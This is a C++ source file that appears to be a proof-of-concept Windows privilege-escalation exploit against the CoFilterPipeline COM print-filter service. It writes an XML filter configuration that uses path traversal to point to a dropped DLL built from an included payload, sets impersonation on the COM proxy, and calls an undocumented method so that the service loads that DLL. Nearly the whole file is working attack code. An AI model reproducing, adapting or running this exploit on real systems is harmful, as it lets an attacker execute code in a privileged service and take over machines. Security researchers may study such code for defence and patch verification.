#include <windows.h>
#include <Objbase.h>
#include <shlwapi.h>
#include <shlobj.h>
#include <sddl.h>
#include <aclapi.h>
#include <stdio.h>
#include <strsafe.h>
#include <comdef.h>
#include "payload.h"

#pragma comment(lib, "rpcrt4.lib")

class __declspec(uuid("dff2ff61-c6d4-4c4a-979a-d7b2ed00a381")) IFilterPipelineExecute : public IUnknown
{
public:
    virtual HRESULT __stdcall Proc3(int p0,
        const wchar_t *p1, const wchar_t *p2, const wchar_t *p3, const wchar_t *p4,
        const wchar_t *p5, const wchar_t *p6, int p7, long p8, int *p9) = 0;
};
_COM_SMARTPTR_TYPEDEF(IFilterPipelineExecute, __uuidof(IFilterPipelineExecute));

void ThrowOnError(HRESULT hr) {
    if (hr != 0)
        throw _com_error(hr);
}

bool CreateXml(const wchar_t *xml_path, const char *dll_path) {
    const char *xml_template =
        "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\r\n<Filters>\r\n<FilterServiceProvider dll=\"%s\"></FilterServiceProvider>\r\n</Filters>";

    HANDLE hFile = CreateFileW(xml_path,
                               GENERIC_READ | GENERIC_WRITE,
                               FILE_SHARE_READ,
                               NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL /*FILE_ATTRIBUTE_HIDDEN*/,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    char xml[1024];
    char _dll_path[MAX_PATH];
    sprintf_s(_dll_path, "..\\..\\..\\..\\..\\..\\%s", &dll_path[3]);
    sprintf_s(xml, xml_template, _dll_path);

    DWORD tmp;
    WriteFile(hFile, (LPVOID)xml, strlen(xml), &tmp, NULL);
    CloseHandle(hFile);
    return true;
}

bool CreateDll(const char *dll_path) {
    HANDLE hFile = CreateFileA(dll_path,
                               GENERIC_READ | GENERIC_WRITE,
                               0,
                               NULL,
                               CREATE_ALWAYS,
                               FILE_ATTRIBUTE_NORMAL /*FILE_ATTRIBUTE_HIDDEN*/,
                               NULL);
    if (hFile == INVALID_HANDLE_VALUE)
        return false;

    DWORD tmp;
    WriteFile(hFile, (LPVOID)payload, sizeof(payload), &tmp, NULL);
    CloseHandle(hFile);
    return true;
}

int main(int argc, char **argv) {
    CoInitialize(nullptr);

#define TEST_DIR "C:\\test"
#define TEST_DIR_W L"C:\\test"
    CreateDirectory(TEST_DIR_W, NULL);
    // any writable directory is ok. It should be failed if executed by low IL proc.

    wchar_t xml_path[MAX_PATH];
    char dll_path[MAX_PATH];

    wsprintf(xml_path, L"%s\\test.xml", TEST_DIR_W);
    sprintf_s(dll_path, "%s\\test.dll", TEST_DIR);
    CreateXml(xml_path, dll_path);
    CreateDll(dll_path);

    CLSID clsid;
    IFilterPipelineExecutePtr filterPipe;
    CLSIDFromString(L"{D54378CD-91D8-4E10-A00B-819F9A9EFCB1}", &clsid); // CoFilterPipeline Class
    ThrowOnError(CoCreateInstance(clsid, nullptr, CLSCTX_LOCAL_SERVER, IID_PPV_ARGS(&filterPipe)));

    DWORD authn_svc;
    DWORD authz_svc;
    LPOLESTR principal_name;
    DWORD authn_level;
    DWORD imp_level;
    RPC_AUTH_IDENTITY_HANDLE identity;
    DWORD capabilities;
    ThrowOnError(CoQueryProxyBlanket(filterPipe, &authn_svc, &authz_svc, &principal_name, &authn_level, &imp_level, &identity, &capabilities));
    ThrowOnError(CoSetProxyBlanket(filterPipe, authn_svc, authz_svc, principal_name, authn_level, RPC_C_IMP_LEVEL_IMPERSONATE, identity, capabilities));

#define PRINTER_NAME L"Microsoft XPS Document Writer"
    int tmp;
    filterPipe->Proc3(
        0,
        xml_path,
        PRINTER_NAME, // parameter to OpenPrinterW (1st call)
        PRINTER_NAME, // parameter to OpenPrinterW (3rd call)
        PRINTER_NAME, // parameter to OpenPrinterW (2nd call)
        L"abc",
        L"xxx",
        0, 0,
        &tmp);

    return 0;
}
